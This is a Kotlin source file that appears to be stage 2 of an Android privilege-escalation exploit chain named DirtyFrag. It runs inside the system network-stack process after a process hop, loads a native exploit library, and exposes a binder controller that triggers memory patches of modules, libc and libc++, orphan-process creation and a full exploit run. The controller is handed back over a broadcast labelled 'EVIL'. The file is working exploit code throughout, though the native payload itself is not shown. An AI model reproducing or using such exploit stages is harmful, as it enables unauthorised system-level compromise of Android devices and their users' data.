package com.polygraphene.df.reroot

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Binder
import android.os.Bundle
import android.os.Parcel
import android.os.RemoteException
import android.util.Log
import org.lsposed.lspromise.DirtyFrag

/**
 * Stage 2: runs INSIDE com.android.networkstack.process after [StageHop]
 * bounces us there via scheduleReceiver (same trick as LSPromise
 * Shellcode.onReceive/stage2).
 *
 * Loads libexp.so from OUR apk (network_stack may dlopen apk natives, unlike
 * system_server) and exposes the DirtyFrag driver as a CONTROLLER binder back
 * to our system_server UI over the EVIL broadcast. LoadLibrary failure (e.g.
 * x86_64 emulator, whose lib is arm64-only) is logged, not fatal: the Java
 * hop itself is still verifiable end to end.
 */
class StageReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        Log.i(TAG, "in network_stack, stage 2")
        Diagnostics.processIdentity(context, "network_stack")  // Gate D
        try {
            stage2(context)
        } catch (t: Throwable) {
            Log.e(TAG, "stage2 failed", t)
        }
        Log.i(TAG, StageHop.cleanupLoadedApk(context))
    }

    private fun stage2(context: Context) {
        try {
            System.loadLibrary("exp")
        } catch (e: UnsatisfiedLinkError) {
            Log.e(TAG, "loadLibrary(exp) failed (arm64-only lib?): $e")
            return
        }
        val controller = object : Binder() {
            override fun onTransact(
                code: Int, data: Parcel, reply: Parcel?, flags: Int
            ): Boolean {
                try {
                    when (code) {
                        1 -> {
                            Log.d(TAG, "executing patchMod")
                            reply?.writeInt(DirtyFrag.patchMod())
                            return true
                        }
                        2 -> {
                            Log.d(TAG, "executing patchLibc")
                            reply?.writeInt(DirtyFrag.patchLibc())
                            return true
                        }
                        3 -> {
                            Log.d(TAG, "executing patchCxx")
                            reply?.writeInt(DirtyFrag.patchCxx())
                            return true
                        }
                        4 -> {
                            Log.d(TAG, "executing orphan")
                            reply?.writeInt(DirtyFrag.createOrphanProcess())
                            return true
                        }
                        5 -> {
                            Log.d(TAG, "run all")
                            val df = DirtyFrag(data.readStrongBinder())
                            reply?.writeInt(df.runAll())
                            return true
                        }
                    }
                } catch (e: RemoteException) {
                    throw e
                } catch (t: Throwable) {
                    Log.e(TAG, "controller transact failed", t)
                }
                return super.onTransact(code, data, reply, flags)
            }
        }

        val i = Intent().apply {
            setPackage(StageHop.PKG)
            action = EVIL_ACTION
            putExtras(Bundle().apply { putBinder("CONTROLLER", controller) })
        }
        context.sendBroadcast(i)
        Log.i(TAG, "controller sent")
    }

    companion object {
        const val TAG = "DFReroot"
        const val EVIL_ACTION = "com.polygraphene.df.reroot.EVIL"
    }
}
